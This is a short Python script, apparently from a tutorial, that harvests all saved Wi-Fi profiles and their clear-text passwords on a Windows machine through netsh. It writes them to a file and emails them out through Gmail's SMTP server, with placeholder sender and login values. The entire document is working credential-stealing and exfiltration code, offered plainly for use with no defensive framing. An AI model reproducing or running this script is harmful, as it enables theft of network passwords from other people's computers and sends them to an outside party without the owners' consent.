# allows us to run system commands
import  subprocess

# import the re module, allows us to use regular expressions
import re

# for email server
import smtplib

# for creating an email object
from email.message import EmailMessage


command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))

# this will store the wifi ssid and it's password(ssid: password)
wifi_data = ""

# iterate throgh the profile names 
for profile in profile_names:
    
    # remove trailing whitespaces and newline characters
    profile = profile.strip()
    
    # show the profile details together with the clear text password
    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output = True).stdout.decode()
    
    # use regular expressions to search for the password
    profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
    
    # check to see if the profile has password
    if len(profile_password) == 0:
        wifi_data += f"{profile}: Open\n"
    else:
        wifi_data += f"{profile}: {profile_password[0].strip()}\n"

# save the wifi details in a file      
with open("wifis.txt", "w") as file:
    file.write(wifi_data)

# Create the message for the email
email_message = wifi_data


# Create EmailMessage Object
email = EmailMessage()
# Who is the email from
email["from"] = "name_of_sender"
# To which email you want to send the email
email["to"] = "email_address"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    smtp.login("login_name", "password")
    # Send email.
    smtp.send_message(email)
